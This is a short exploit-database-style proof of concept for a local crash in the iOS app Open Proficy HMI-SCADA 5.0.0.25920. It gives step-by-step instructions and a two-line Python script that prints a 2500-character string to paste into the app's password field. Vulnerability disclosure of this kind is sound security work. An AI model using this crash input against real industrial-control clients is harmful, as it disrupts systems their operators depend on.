# Exploit Title: Open Proficy HMI-SCADA 5.0.0.25920 - 'Password' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2019-11-16
# Vendor Homepage: https://apps.apple.com/us/app/proficyscada/id525792142
# Software Link: App Store for iOS devices
# GE Intelligent Platforms, Inc.
# Tested Version: 5.0.0.25920
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 7 iOS 13.2

# Steps to Produce the Crash:
# 1.- Run python code: Open_Proficy_HMI-SCADA_for_iOS_5.0.0.25920.py
# 2.- Copy content to clipboard
# 3.- Open "Open Proficy HMI-SCADA for iOS"
# 4.- Host List > "+"
# 5.- Add Host
# 6.- Address Type "IP Address"
# 7.- Host IP Address "192.168.1.1"
# 8.- User Name "l4m5"
# 9.- Paste ClipBoard on "Password"
# 10.- Add
# 11.- Connect
# 12.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 2500
print (buffer)